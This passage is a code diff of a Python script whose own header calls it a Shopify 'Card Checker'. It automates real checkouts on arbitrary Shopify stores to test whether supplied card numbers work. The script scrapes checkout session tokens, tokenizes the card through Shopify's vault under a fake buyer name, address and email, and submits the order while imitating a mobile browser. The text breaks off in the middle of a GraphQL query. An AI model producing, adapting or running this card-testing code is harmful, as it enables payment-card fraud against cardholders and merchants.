@@ -1,6 +1,7 @@
 """
-Shopify Terminal - GraphQL Checkout Card Checker
-Based on api.py style with full GraphQL checkout flow
+Shopify GraphQL Checkout API
+Real checkout flow using GraphQL mutations
+Usage: await autoshopify(url, card, session)
 """
 
 import asyncio
@@ -9,7 +10,6 @@ import json
 import time
 import random
 import string
-import re
 from urllib.parse import urlparse
 
 
@@ -27,7 +27,7 @@ C2C = {
 }
 
 # Address book for different countries
-ADDRESS_BOOK = {
+book = {
     "US": {"address1": "123 Main St", "city": "New York", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
     "CA": {"address1": "88 Queen St", "city": "Toronto", "postalCode": "M5J2J3", "zoneCode": "ON", "countryCode": "CA", "phone": "4165550198"},
     "GB": {"address1": "221B Baker Street", "city": "London", "postalCode": "NW1 6XE", "zoneCode": "LND", "countryCode": "GB", "phone": "2079460123"},
@@ -41,9 +41,24 @@ ADDRESS_BOOK = {
     "DEFAULT": {"address1": "123 Main St", "city": "New York", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
 }
 
-# Random name generators
-FIRST_NAMES = ['John', 'James', 'Robert', 'Michael', 'William', 'David', 'Richard', 'Joseph', 'Thomas', 'Charles']
-LAST_NAMES = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez']
+
+def pick_addr(url, cc=None, rc=None):
+    """Pick appropriate address based on currency and country"""
+    cc = (cc or "").upper()
+    rc = (rc or "").upper()
+    dom = urlparse(url).netloc
+    tcn = dom.split('.')[-1].upper()
+
+    if tcn in book:
+        return book[tcn]
+
+    ccn = C2C.get(cc)
+
+    if rc in book and ccn == rc:
+        return book[rc]
+    elif rc in book:
+        return book[rc]
+    return book["DEFAULT"]
 
 
 def capture(data, first, last):
@@ -54,37 +69,6 @@ def capture(data, first, last):
         return data[start:end]
     except ValueError:
         return None
-
-
-def pick_addr(url, cc=None, rc=None):
-    """Pick appropriate address based on currency and country"""
-    cc = (cc or "").upper()
-    rc = (rc or "").upper()
-    dom = urlparse(url).netloc
-    tcn = dom.split('.')[-1].upper()
-
-    if tcn in ADDRESS_BOOK:
-        return ADDRESS_BOOK[tcn]
-
-    ccn = C2C.get(cc)
-
-    if rc in ADDRESS_BOOK and ccn == rc:
-        return ADDRESS_BOOK[rc]
-    elif rc in ADDRESS_BOOK:
-        return ADDRESS_BOOK[rc]
-    return ADDRESS_BOOK["DEFAULT"]
-
-
-def generate_random_name():
-    """Generate random first and last name"""
-    return random.choice(FIRST_NAMES), random.choice(LAST_NAMES)
-
-
-def generate_email(first_name, last_name):
-    """Generate random email address"""
-    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com']
-    random_num = ''.join(random.choices(string.digits, k=3))
-    return f"{first_name.lower()}.{last_name.lower()}{random_num}@{random.choice(domains)}"
 
 
 def get_product_id(response):
@@ -119,16 +103,23 @@ def get_product_id(response):
         return None, None
 
 
-async def shopify_checkout(url, card, session):
+async def autoshopify(url, card, session):
     """
     Main Shopify GraphQL checkout function
-    Returns dict with Response, Status, Gateway, Price, cc
+    
+    Args:
+        url: Shopify store URL (e.g., "https://example.com")
+        card: Card details in format "cc|mm|yy|cvv"
+        session: httpx.AsyncClient session
+        
+    Returns:
+        dict with Response, Status, Gateway, Price, cc
     """
     output = {
         "Response": "UNKNOWN ERROR",
         "Status": False,
     }
-    start_time = time.time()
+    start = time.time()
     
     try:
         # Parse card details
@@ -144,58 +135,35 @@ async def shopify_checkout(url, card, session):
             url = f"https://{url}"
         domain = urlparse(url).netloc
         
-        # Generate random buyer info
-        first_name, last_name = generate_random_name()
-        email = generate_email(first_name, last_name)
+        # Get products
+        request = await session.get(f"{url}/products.json")
+        product_id, price = get_product_id(request)
         
-        print(f"[*] Fetching products from {domain}...")
-        
-        # Step 1: Get products
-        try:
-            request = await session.get(f"{url}/products.json", timeout=15.0)
-            product_id, price = get_product_id(request)
-        except Exception as e:
-            output.update({
-                "Response": f"PRODUCTS ERROR: {str(e)}",
-                "Status": False,
-            })
-            return output
-            
         if not product_id:
             output.update({
-                "Response": "NO AVAILABLE PRODUCTS",
+                "Response": "PRODUCT EMPTY",
                 "Status": False,
             })
+            print(json.dumps(output))
             return output
-            
-        print(f"[+] Found product: ${price:.2f} (ID: {product_id})")
         
-        # Step 2: Get storefront access token
+        # Get site access token
         try:
-            request = await session.get(url, timeout=15.0)
-            site_key = capture(request.text, '"accessToken":"', '"')
-        except Exception as e:
+            request = await session.get(url)
+        except:
             output.update({
-                "Response": f"SITE ERROR: {str(e)}",
+                "Response": "SITE DEAD",
                 "Status": False,
             })
+            print(json.dumps(output))
             return output
             
-        if not site_key:
-            output.update({
-                "Response": "NO STOREFRONT ACCESS TOKEN",
-                "Status": False,
-            })
-            return output
-            
-        print(f"[+] Got storefront access token")
+        site_key = capture(request.text, '"accessToken":"', '"')
         
-        # Step 3: Create cart using GraphQL
-        print(f"[*] Creating cart...")
-        
+        # Cart create headers
         headers = {
             'accept': 'application/json',
-            'accept-language': 'en-US,en;q=0.9',
+            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
             'content-type': 'application/json',
             'origin': url,
             'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
@@ -210,11 +178,13 @@ async def shopify_checkout(url, card, session):
             'x-start-wallet-checkout': 'true',
             'x-wallet-name': 'MoreOptions'
         }
-        
-        cart_query = 'mutation cartCreate($input:CartInput!$country:CountryCode$language:LanguageCode$withCarrierRates:Boolean=false)@inContext(country:$country language:$language){result:cartCreate(input:$input){...@defer(if:$withCarrierRates){cart{...CartParts}errors:userErrors{...on CartUserError{message field code}}warnings:warnings{...on CartWarning{code}}}}}fragment CartParts on Cart{id checkoutUrl deliveryGroups(first:10 withCarrierRates:$withCarrierRates){edges{node{id groupType selectedDeliveryOption{code title handle deliveryPromise deliveryMethodType estimatedCost{amount currencyCode}}deliveryOptions{code title handle deliveryPromise deliveryMethodType estimatedCost{amount currencyCode}}}}}cost{subtotalAmount{amount currencyCode}totalAmount{amount currencyCode}totalTaxAmount{amount currencyCode}totalDutyAmount{amount currencyCode}}discountAllocations{discountedAmount{amount currencyCode}...on CartCodeDiscountAllocation{code}...on CartAutomaticDiscountAllocation{title}...on CartCustomDiscountAllocation{title}}discountCodes{code applicable}lines(first:10){edges{node{quantity cost{subtotalAmount{amount currencyCode}totalAmount{amount currencyCode}}discountAllocations{discountedAmount{amount currencyCode}...on CartCodeDiscountAllocation{code}...on CartAutomaticDiscountAllocation{title}...on CartCustomDiscountAllocation{title}}merchandise{...on ProductVariant{requiresShipping}}sellingPlanAllocation{priceAdjustments{price{amount currencyCode}}sellingPlan{billingPolicy{...on SellingPlanRecurringBillingPolicy{interval intervalCount}}priceAdjustments{orderCount}recurringDeliveries}}}}}}'
-        
-        cart_data = {
-            'query': cart_query,
+
+        params = {
+            'operation_name': 'cartCreate'
+        }
+
+        json_data = {
+            'query': 'mutation cartCreate($input:CartInput!$country:CountryCode$language:LanguageCode$withCarrierRates:Boolean=false)@inContext(country:$country language:$language){result:cartCreate(input:$input){...@defer(if:$withCarrierRates){cart{...CartParts}errors:userErrors{...on CartUserError{message field code}}warnings:warnings{...on CartWarning{code}}}}}fragment CartParts on Cart{id checkoutUrl deliveryGroups(first:10 withCarrierRates:$withCarrierRates){edges{node{id groupType selectedDeliveryOption{code title handle deliveryPromise deliveryMethodType estimatedCost{amount currencyCode}}deliveryOptions{code title handle deliveryPromise deliveryMethodType estimatedCost{amount currencyCode}}}}}cost{subtotalAmount{amount currencyCode}totalAmount{amount currencyCode}totalTaxAmount{amount currencyCode}totalDutyAmount{amount currencyCode}}discountAllocations{discountedAmount{amount currencyCode}...on CartCodeDiscountAllocation{code}...on CartAutomaticDiscountAllocation{title}...on CartCustomDiscountAllocation{title}}discountCodes{code applicable}lines(first:10){edges{node{quantity cost{subtotalAmount{amount currencyCode}totalAmount{amount currencyCode}}discountAllocations{discountedAmount{amount currencyCode}...on CartCodeDiscountAllocation{code}...on CartAutomaticDiscountAllocation{title}...on CartCustomDiscountAllocation{title}}merchandise{...on ProductVariant{requiresShipping}}sellingPlanAllocation{priceAdjustments{price{amount currencyCode}}sellingPlan{billingPolicy{...on SellingPlanRecurringBillingPolicy{interval intervalCount}}priceAdjustments{orderCount}recurringDeliveries}}}}}}',
             'variables': {
                 'input': {
                     'lines': [
@@ -230,33 +200,14 @@ async def shopify_checkout(url, card, session):
                 'language': 'EN',
             },
         }
-        
-        request = await session.post(
-            f'{url}/api/unstable/graphql.json',
-            params={'operation_name': 'cartCreate'},
-            headers=headers,
-            json=cart_data,
-            timeout=20.0
-        )
-        
-        try:
-            data = request.json()
-            checkout_url = data["data"]["result"]["cart"]["checkoutUrl"]
-        except Exception as e:
-            output.update({
-                "Response": f"CART CREATE FAILED: {str(e)}",
-                "Status": False,
-            })
-            return output
-            
-        print(f"[+] Cart created, checkout URL obtained")
-        
-        # Step 4: Access checkout page and extract tokens
-        print(f"[*] Accessing checkout page...")
-        
-        checkout_headers = {
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-            'accept-language': 'en-US,en;q=0.9',
+
+        request = await session.post(f'{url}/api/unstable/graphql.json', params=params, headers=headers, json=json_data)
+        data = request.json()
+        checkout_url = data["data"]["result"]["cart"]["checkoutUrl"]
+
+        headers = {
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
             'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
@@ -267,56 +218,41 @@ async def shopify_checkout(url, card, session):
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
         }
+
+        params = {
+            'skip_shop_pay': 'true'
+        }
+
+        request = await session.get(checkout_url, headers=headers, params=params, follow_redirects=True)
         
-        request = await session.get(
-            checkout_url,
-            headers=checkout_headers,
-            params={'skip_shop_pay': 'true'},
-            follow_redirects=True,
-            timeout=20.0
-        )
+        # Extract tokens from checkout page
+        paymentMethodIdentifier = capture(request.text, "paymentMethodIdentifier&quot;:&quot;", "&quot")
+        stable_id = capture(request.text, "stableId&quot;:&quot;", "&quot")
+        queue_token = capture(request.text, "queueToken&quot;:&quot;", "&quot")
+        currencyCode = capture(request.text, "currencyCode&quot;:&quot;", "&quot")
+        countryCode = capture(request.text, "countryCode&quot;:&quot;", "&quot")
+        x_checkout_one_session_token = capture(request.text, 'serialized-session-token" content="&quot;', '&quot')
+        token = capture(request.text, 'serialized-source-token" content="&quot;', '&quot')
+        web_build = capture(request.text, 'serialized-client-bundle-info" content="{&quot;browsers&quot;:&quot;latest&quot;,&quot;format&quot;:&quot;es&quot;,&quot;locale&quot;:&quot;en&quot;,&quot;sha&quot;:&quot;', '&quot')
+        tax = capture(request.text, "totalTaxAndDutyAmount&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;", "&quot")
+        gateway = capture(request.text, 'extensibilityDisplayName&quot;:&quot;', '&quot')
+        DMT = capture(request.text, 'deliveryMethodTypes&quot;:[&quot;', '&quot;],&quot;')
         
-        # Extract required tokens from checkout page
-        html = request.text
-        
-        payment_method_id = capture(html, "paymentMethodIdentifier&quot;:&quot;", "&quot")
-        stable_id = capture(html, "stableId&quot;:&quot;", "&quot")
-        queue_token = capture(html, "queueToken&quot;:&quot;", "&quot")
-        currency_code = capture(html, "currencyCode&quot;:&quot;", "&quot") or "USD"
-        country_code = capture(html, "countryCode&quot;:&quot;", "&quot") or "US"
-        session_token = capture(html, 'serialized-session-token" content="&quot;', '&quot')
-        source_token = capture(html, 'serialized-source-token" content="&quot;', '&quot')
-        web_build = capture(html, 'serialized-client-bundle-info" content="{&quot;browsers&quot;:&quot;latest&quot;,&quot;format&quot;:&quot;es&quot;,&quot;locale&quot;:&quot;en&quot;,&quot;sha&quot;:&quot;', '&quot')
-        tax = capture(html, "totalTaxAndDutyAmount&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;", "&quot") or "0"
-        delivery_method_type = capture(html, 'deliveryMethodTypes&quot;:[&quot;', '&quot;],&quot;') or "SHIPPING"
-        
-        # Get gateway info
-        gateway = capture(html, 'extensibilityDisplayName&quot;:&quot;', '&quot')
         if gateway == "Shopify Payments":
             gateway = "Normal"
-        elif not gateway:
+        elif gateway:
+            gateway = gateway
+        else:
             gateway = "Unknown"
-            
-        if not session_token:
-            output.update({
-                "Response": "NO SESSION TOKEN",
-                "Status": False,
-            })
-            return output
-            
-        print(f"[+] Tokens extracted - Gateway: {gateway}")
-        
-        # Get appropriate address
-        addr = pick_addr(url, cc=currency_code, rc=country_code)
+
+        addr = pick_addr(url, cc=currencyCode, rc=countryCode)
         
         try:
             ttax = float(tax) if tax else 0
-        except (ValueError, TypeError):
+        except:
             ttax = 0
-            
-        # Step 5: Tokenize card via Shopify Vault
-        print(f"[*] Tokenizing card...")
-        
+
+        # Tokenize card
         vault_headers = {
             'accept': 'application/json',
             'accept-language': 'en-US,en;q=0.9',
@@ -330,45 +266,41 @@ async def shopify_checkout(url, card, session):
             'sec-fetch-site': 'cross-site',
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
         }
-        
+
         vault_data = {
             "credit_card": {
                 "number": cc,
-                "name": f"{first_name} {last_name}",
+                "name": "Laka Lama",
                 "month": int(mes),
                 "year": int(f"20{ano}") if len(ano) == 2 else int(ano),
                 "verification_value": cvv
             },
             "payment_session_scope": domain
         }
-        
+
         vault_request = await session.post(
             "https://vault.shopify.com/sessions",
             headers=vault_headers,
-            json=vault_data,
-            timeout=15.0
+            json=vault_data
         )
-        
+
         try:
             vault_response = vault_request.json()
-            session_id = vault_response.get("id")
-        except Exception:
-            session_id = None
-            
-        if not session_id:
+            sessionid = vault_response.get("id")
+        except:
+            sessionid = None
+
+        if not sessionid:
             output.update({
                 "Response": "CARD TOKENIZATION FAILED",
                 "Status": False,
                 "Gateway": gateway,
             })
+            print(json.dumps(output))
             return output
-            
-        print(f"[+] Card tokenized successfully")
-        
-        # Step 6: Submit Proposal (shipping info)
-        print(f"[*] Submitting shipping proposal...")
-        
-        graphql_headers = {
+
+        # Proposal headers
+        headers = {
             'authority': domain,
             'accept': 'application/json',
             'accept-language': 'en-US',
@@ -383,21 +315,23 @@ async def shopify_checkout(url, card, session):
             'sec-fetch-site': 'same-origin',
             'shopify-checkout-client': 'checkout-web/1.0',
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
-            'x-checkout-one-session-token': session_token,
-            'x-checkout-web-build-id': web_build or '',
+            'x-checkout-one-session-token': x_checkout_one_session_token,
+            'x-checkout-web-build-id': web_build,
             'x-checkout-web-deploy-stage': 'production',
             'x-checkout-web-server-handling': 'fast',
             'x-checkout-web-server-rendering': 'yes',
-            'x-checkout-web-source-id': source_token or ''
+            'x-checkout-web-source-id': token
         }
-        
-        proposal_query = 'query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput,$memberships:MembershipsInput,$cartMetafields:[MetafieldInput!]){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions,memberships:$memberships,cartMetafields:$cartMetafields},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{queueToken sellerProposal{delivery{...on FilledDeliveryTerms{deliveryLines{availableDeliveryStrategies{handle deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode}}}}}}}}}}}}}}'
-        
-        proposal_data = {
-            'query': proposal_query,
+
+        params = {
+            'operationName': 'Proposal'
+        }
+
+        json_data = {
+            'query': 'query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput,$memberships:MembershipsInput,$cartMetafields:[MetafieldInput!]){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions,memberships:$memberships,cartMetafields:$cartMetafields},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{queueToken sellerProposal{delivery{...on FilledDeliveryTerms{deliveryLines{availableDeliveryStrategies{handle deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode}}}}}}}}}}}}}',
             'variables': {
                 'sessionInput': {
-                    'sessionToken': session_token,
+                    'sessionToken': x_checkout_one_session_token,
                 },
                 'queueToken': queue_token,
                 'discounts': {
@@ -413,8 +347,8 @@ async def shopify_checkout(url, card, session):
                                     'city': addr["city"],
                                     'countryCode': addr["countryCode"],
                                     'postalCode': addr["postalCode"],
-                                    'firstName': first_name,
-                                    'lastName': last_name,
+                                    'firstName': 'Laka',
+                                    'lastName': 'Lama',
                                     'zoneCode': addr["zoneCode"],
                                     'phone': addr["phone"],
                                     'oneTimeUse': False,
@@ -435,8 +369,8 @@ async def shopify_checkout(url, card, session):
                                 'any': True,
                             },
                             'deliveryMethodTypes': [
-                                'SHIPPING',
-                                'LOCAL',
+                               'SHIPPING',
+                               'LOCAL',
                             ],
                             'expectedTotalPrice': {
                                 'any': True,
@@ -473,7 +407,7 @@ async def shopify_checkout(url, card, session):
                             'expectedTotalPrice': {
                                 'value': {
                                     'amount': f"{price}",
-                                    'currencyCode': f'{currency_code}',
+                                    'currencyCode': f'{currencyCode}',
                                 },
                             },
                             'lineComponentsSource': None,
@@ -495,8 +429,8 @@ async def shopify_checkout(url, card, session):
                             'city': addr["city"],
                             'countryCode': addr["countryCode"],
                             'postalCode': addr["postalCode"],
-                            'firstName': first_name,
-                            'lastName': last_name,
+                            'firstName': 'Laka',
+                            'lastName': 'Lama',
                             'zoneCode': addr["zoneCode"],
                             'phone': addr["phone"],
                         },
@@ -504,15 +438,15 @@ async def shopify_checkout(url, card, session):
                 },
                 'buyerIdentity': {
                     'customer': {
-                        'presentmentCurrency': f'{currency_code}',
-                        'countryCode': f'{country_code}',
+                        'presentmentCurrency': f'{currencyCode}',
+                        'countryCode': f'{countryCode}',
                     },
-                    'email': email,
+                    'email': 'genmahuha@gmail.com',
                     'emailChanged': False,
-                    'phoneCountryCode': f'{country_code}',
+                    'phoneCountryCode': f'{countryCode}',
                     'marketingConsent': [],
                     'shopPayOptInPhone': {
-                        'countryCode': f'{country_code}',
+                        'countryCode': f'{countryCode}',
                     },
                     'rememberMe': False,
                 },
@@ -524,7 +458,7 @@ async def shopify_checkout(url, card, session):
                     'proposedTotalAmount': {
                         'value': {
                             'amount': f"{ttax}",
-                            'currencyCode': f'{currency_code}',
+                            'currencyCode': f'{currencyCode}',
                         },
                     },
                     'proposedTotalIncludedAmount': None,
@@ -538,6 +472,7 @@ async def shopify_checkout(url, card, session):
                 'localizationExtension': {
                     'fields': [],
                 },
+
                 'nonNegotiableTerms': None,
                 'scriptFingerprint': {
                     'signature': None,
@@ -554,63 +489,51 @@ async def shopify_checkout(url, card, session):
             'operationName': 'Proposal',
         }
         
-        # Retry proposal up to 3 times
-        shipping_handle = None
-        shipping_amount = "0"
-        
         for _ in range(3):
-            request = await session.post(
-                f'{url}/checkouts/unstable/graphql',
-                params={'operationName': 'Proposal'},
-                headers=graphql_headers,
-                json=proposal_data,
-                timeout=20.0
-            )
-            
-            if "signedHandle" in request.text or "handle" in request.text:
-                try:
-                    resp_json = request.json()
-                    delivery_lines = resp_json.get("data", {}).get("session", {}).get("negotiate", {}).get("result", {}).get("sellerProposal", {}).get("delivery", {}).get("deliveryLines", [])
-                    if delivery_lines:
-                        strategies = delivery_lines[0].get("availableDeliveryStrategies", [])
-                        if strategies:
-                            shipping_handle = strategies[0].get("handle")
-                            breakdown = strategies[0].get("deliveryStrategyBreakdown", [])
-                            if breakdown:
-                                shipping_amount = breakdown[0].get("amount", {}).get("value", {}).get("amount", "0")
-                except Exception:
-                    pass
+            request = await session.post(f'{url}/checkouts/unstable/graphql', params=params, headers=headers, json=json_data)
+            if "signedHandle" in request.text:
                 break
-            await asyncio.sleep(0.5)
+            else:
+                continue
+
+        try:
+            seller = request.json()["data"]["session"]["negotiate"]["result"]["sellerProposal"]["delivery"]["deliveryLines"][0]["availableDeliveryStrategies"][0]
+            amount = seller["deliveryStrategyBreakdown"][0]["amount"]["value"]["amount"]
+        except:
+            amount = "0"
             
-        if not shipping_handle:
+        try:
+            total = price + float(amount) + float(ttax)
+        except:
+            total = price
+        
+        try:
+            handle = seller["handle"]
+        except:
+            handle = None
+            
+        if not handle:
             output.update({
-                "Response": "NO SHIPPING OPTIONS",
+                "Response": "HANDLE EMPTY",
                 "Status": False,
                 "Gateway": gateway,
-                "Price": price,
+                "Price": total,
             })
+            print(json.dumps(output))
             return output
-            
-        print(f"[+] Shipping proposal submitted - Amount: ${shipping_amount}")
-        
-        # Calculate total
-        try:
-            total = price + float(shipping_amount) + ttax
-        except (ValueError, TypeError):
-            total = price
-            
-        # Step 7: Submit for completion
-        print(f"[*] Submitting order (Total: ${total:.2f})...")
-        
-        submit_query = 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage nonLocalizedMessage}}}...on Throttled{pollAfter pollUrl queueToken}...on CheckpointDenied{redirectUrl}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderStatusPageUrl __typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}'
-        
-        submit_data = {
-            'query': submit_query,
+
+        await asyncio.sleep(0.1)
+
+        params = {
+            'operationName': 'SubmitForCompletion'
+        }
+
+        json_data = {
+            'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}errors{...on NegotiationError{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{message{code localizedDescription __typename}target __typename}...on AcceptNewTermViolation{message{code localizedDescription __typename}target __typename}...on ConfirmChangeViolation{message{code localizedDescription __typename}from to __typename}...on UnprocessableTermViolation{message{code localizedDescription __typename}target __typename}...on UnresolvableTermViolation{message{code localizedDescription __typename}target __typename}...on ApplyChangeViolation{message{code localizedDescription __typename}target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on InputValidationError{field __typename}...on PendingTermViolation{__typename}__typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken buyerProposal{...BuyerProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments paymentExtensionBrand analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder payEscrowMayExist buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{splitShippingToggle deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice flatRateGroupId targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on 